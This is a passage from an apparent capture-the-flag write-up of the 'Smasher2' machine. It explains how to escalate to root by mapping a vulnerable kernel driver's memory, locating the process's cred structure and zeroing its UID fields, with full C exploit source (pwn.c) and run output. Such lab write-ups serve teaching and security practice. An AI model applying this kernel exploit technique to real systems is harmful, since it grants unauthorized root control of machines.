<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:&#x2F;dev&#x2F;shm$ cat &#x2F;proc&#x2F;8186&#x2F;maps </span><br><span class="line">42424000-132424000 rw-s 00000000 00:06 440                               &#x2F;dev&#x2F;dhid</span><br><span class="line">----------</span><br><span class="line"> Redacted</span><br><span class="line">----------</span><br><span class="line">dzonerzy@smasher2:&#x2F;dev&#x2F;shm$</span><br></pre></td></tr></table></figure>
<p>Now we can start searching for the <code>cred</code> structure that belongs to our process, if we take a look at the how the <a href="https://elixir.bootlin.com/linux/latest/source/include/linux/cred.h" target="_blank" rel="noopener"><code>cred</code> structure</a> looks like:  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we're permitted */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="comment">/* RCU deletion */</span></span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="keyword">int</span> non_rcu;			<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We’ll notice that the first 8 integers (representing our <code>uid</code>, <code>gid</code>, saved <code>uid</code>, saved <code>gid</code>, effective <code>uid</code>, effective <code>gid</code>, <code>uid</code> and <code>gid</code> for the virtual file system) are known to us, which represents a reliable pattern to search for in the memory:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br></pre></td></tr></table></figure>
<p>These 8 integers are followed by a variable called <code>securebits</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br></pre></td></tr></table></figure>
<p>Then that variable is followed by our capabilities:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we're permitted */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br></pre></td></tr></table></figure>
<p>Since we know the first 8 integers we can search through the memory for that pattern, when we find a valid <code>cred</code> structure pattern we’ll overwrite each integer of the 8 with a <code>0</code> and check if our <code>uid</code> changed to <code>0</code>, we’ll keep doing it until we overwrite the one which belongs to our process, then we’ll overwrite the capabilities with <code>0xffffffffffffffff</code> and execute <code>/bin/sh</code>. Let’s try to implement the search for <code>cred</code> structures first.<br>To do that we will get our <code>uid</code> with <code>getuid()</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> uid = getuid();</span><br></pre></td></tr></table></figure>
<p>Then search for 8 consecutive integers that are equal to our <code>uid</code>, when we find a <code>cred</code> structure we’ll print its pointer and keep searching:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr) &lt; (mmapStart + <span class="built_in">size</span> - <span class="number">0x40</span>))&#123;</span><br><span class="line">	credIt = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(</span><br><span class="line">		addr[credIt++] == uid &amp;&amp;</span><br><span class="line">		addr[credIt++] == uid &amp;&amp;</span><br><span class="line">		addr[credIt++] == uid &amp;&amp;</span><br><span class="line">		addr[credIt++] == uid &amp;&amp;</span><br><span class="line">		addr[credIt++] == uid &amp;&amp;</span><br><span class="line">		addr[credIt++] == uid &amp;&amp;</span><br><span class="line">		addr[credIt++] == uid &amp;&amp;</span><br><span class="line">		addr[credIt++] == uid</span><br><span class="line">		)&#123;</span><br><span class="line">			credNum++;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"[*] Cred structure found! ptr: %p, crednum: %d\n"</span>, addr, credNum);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	addr++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>pwn.c</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;                                                                          </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;                                                        </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;                                                       </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * <span class="keyword">const</span> * argv)</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+] PID: %d\n"</span>, getpid());</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/dhid"</span>, O_RDWR);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[!] Open failed!\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[*] Open OK fd: %d\n"</span>, fd);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">size</span> = <span class="number">0xf0000000</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> mmapStart = <span class="number">0x42424000</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> * addr = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)mmap((<span class="keyword">void</span>*)mmapStart, <span class="built_in">size</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0x0</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (addr == MAP_FAILED)&#123;</span><br><span class="line">		perror(<span class="string">"[!] Failed to mmap"</span>);</span><br><span class="line">		<span class="built_in">close</span>(fd);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[*] mmap OK address: %lx\n"</span>, addr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> uid = getuid();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[*] Current UID: %d\n"</span>, uid);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> credIt = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> credNum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr) &lt; (mmapStart + <span class="built_in">size</span> - <span class="number">0x40</span>))&#123;</span><br><span class="line">		credIt = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span>(</span><br><span class="line">			addr[credIt++] == uid &amp;&amp;</span><br><span class="line">			addr[credIt++] == uid &amp;&amp;</span><br><span class="line">			addr[credIt++] == uid &amp;&amp;</span><br><span class="line">			addr[credIt++] == uid &amp;&amp;</span><br><span class="line">			addr[credIt++] == uid &amp;&amp;</span><br><span class="line">			addr[credIt++] == uid &amp;&amp;</span><br><span class="line">			addr[credIt++] == uid &amp;&amp;</span><br><span class="line">			addr[credIt++] == uid</span><br><span class="line">			)&#123;</span><br><span class="line">				credNum++;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"[*] Cred structure found! ptr: %p, crednum: %d\n"</span>, addr, credNum);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		addr++;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fflush(<span class="built_in">stdout</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> <span class="built_in">stop</span> = getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>It worked:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:&#x2F;dev&#x2F;shm$ .&#x2F;pwn </span><br><span class="line">[+] PID: 1215</span><br><span class="line">[*] Open OK fd: 3</span><br><span class="line">[*] mmap OK address: 42424000</span><br><span class="line">[*] Current UID: 1000</span><br><span class="line">[*] Cred structure found! ptr: 0x76186484, crednum: 1</span><br><span class="line">[*] Cred structure found! ptr: 0x76186904, crednum: 2</span><br><span class="line">[*] Cred structure found! ptr: 0x76186b44, crednum: 3</span><br><span class="line">[*] Cred structure found! ptr: 0x76186cc4, crednum: 4</span><br><span class="line">[*] Cred structure found! ptr: 0x76186d84, crednum: 5</span><br><span class="line">[*] Cred structure found! ptr: 0x76186fc4, crednum: 6</span><br><span class="line">[*] Cred structure found! ptr: 0x761872c4, crednum: 7</span><br><span class="line">[*] Cred structure found! ptr: 0x76187684, crednum: 8</span><br><span class="line">[*] Cred structure found! ptr: 0x76187984, crednum: 9</span><br><span class="line">[*] Cred structure found! ptr: 0x76187b04, crednum: 10</span><br><span class="line">[*] Cred structure found! ptr: 0x76187bc4, crednum: 11</span><br><span class="line">[*] Cred structure found! ptr: 0x76187c84, crednum: 12</span><br><span class="line">[*] Cred structure found! ptr: 0x77112184, crednum: 13</span><br><span class="line">[*] Cred structure found! ptr: 0x771123c4, crednum: 14</span><br><span class="line">[*] Cred structure found! ptr: 0x77112484, crednum: 15</span><br><span class="line">[*] Cred structure found! ptr: 0x771129c4, crednum: 16</span><br><span class="line">[*] Cred structure found! ptr: 0x77113084, crednum: 17</span><br><span class="line">[*] Cred structure found! ptr: 0x77113144, crednum: 18</span><br><span class="line">[*] Cred structure found! ptr: 0x77113504, crednum: 19</span><br><span class="line">[*] Cred structure found! ptr: 0x77113c84, crednum: 20</span><br><span class="line">[*] Cred structure found! ptr: 0x7714a604, crednum: 21</span><br><span class="line">[*] Cred structure found! ptr: 0x7714aa84, crednum: 22</span><br><span class="line">[*] Cred structure found! ptr: 0x7714ac04, crednum: 23</span><br><span class="line">[*] Cred structure found! ptr: 0x7714afc4, crednum: 24</span><br><span class="line">[*] Cred structure found! ptr: 0x7714ba44, crednum: 25</span><br><span class="line">[*] Cred structure found! ptr: 0xb9327bc4, crednum: 26</span><br><span class="line"></span><br><span class="line">dzonerzy@smasher2:&#x2F;dev&#x2F;shm$</span><br></pre></td></tr></table></figure>
<p>Now we need to overwrite the <code>cred</code> structure that belongs to our process, we’ll keep overwriting every <code>cred</code> structure we find and check our <code>uid</code>, when we overwrite the one that belongs to our process our <code>uid</code> should be <code>0</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">credIt = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">		</span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[*] Process cred structure found ptr: %p, crednum: %d\n"</span>, addr, credNum);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>pwn.c</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;                                                                          </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;                                                        </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;                                                       </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * <span class="keyword">const</span> * argv)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+] PID: %d\n"</span>, getpid());</span><br><span class="line">	<span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/dhid"</span>, O_RDWR);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[!] Open failed!\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[*] Open OK fd: %d\n"</span>, fd);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">size</span> = <span class="number">0xf0000000</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> mmapStart = <span class="number">0x42424000</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> * addr = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)mmap((<span class="keyword">void</span>*)mmapStart, <span class="built_in">size</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0x0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (addr == MAP_FAILED)&#123;</span><br><span class="line">		perror(<span class="string">"Failed to mmap: "</span>);</span><br><span class="line">		<span class="built_in">close</span>(fd);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[*] mmap OK address: %lx\n"</span>, addr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> uid = getuid();</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[*] Current UID: %d\n"</span>, uid);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> credIt = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> credNum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr) &lt; (mmapStart + <span class="built_in">size</span> - <span class="number">0x40</span>))&#123;</span><br><span class="line"></span><br><span class="line">		credIt = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">if</span>(</span><br><span class="line">			addr[credIt++] == uid &amp;&amp;</span><br><span class="line">			addr[credIt++] == uid &amp;&amp;</span><br><span class="line">			addr[credIt++] == uid &amp;&amp;</span><br><span class="line">			addr[credIt++] == uid &amp;&amp;</span><br><span class="line">			addr[credIt++] == uid &amp;&amp;</span><br><span class="line">			addr[credIt++] == uid &amp;&amp;</span><br><span class="line">			addr[credIt++] == uid &amp;&amp;</span><br><span class="line">			addr[credIt++] == uid</span><br><span class="line">			)&#123;</span><br><span class="line">				credNum++;</span><br><span class="line">			</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"[*] Cred structure found! ptr: %p, crednum: %d\n"</span>, addr, credNum);</span><br><span class="line">		</span><br><span class="line">			credIt = <span class="number">0</span>;</span><br><span class="line">			addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">			addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">			addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">			addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">			addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">			addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">			addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">			addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">		</span><br><span class="line">			<span class="keyword">if</span> (getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"[*] Process cred structure found ptr: %p, crednum: %d\n"</span>, addr, credNum);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				credIt = <span class="number">0</span>;</span><br><span class="line">				addr[credIt++] = uid;</span><br><span class="line">				addr[credIt++] = uid;</span><br><span class="line">				addr[credIt++] = uid;</span><br><span class="line">				addr[credIt++] = uid;</span><br><span class="line">				addr[credIt++] = uid;</span><br><span class="line">				addr[credIt++] = uid;</span><br><span class="line">				addr[credIt++] = uid;</span><br><span class="line">				addr[credIt++] = uid;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	addr++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fflush(<span 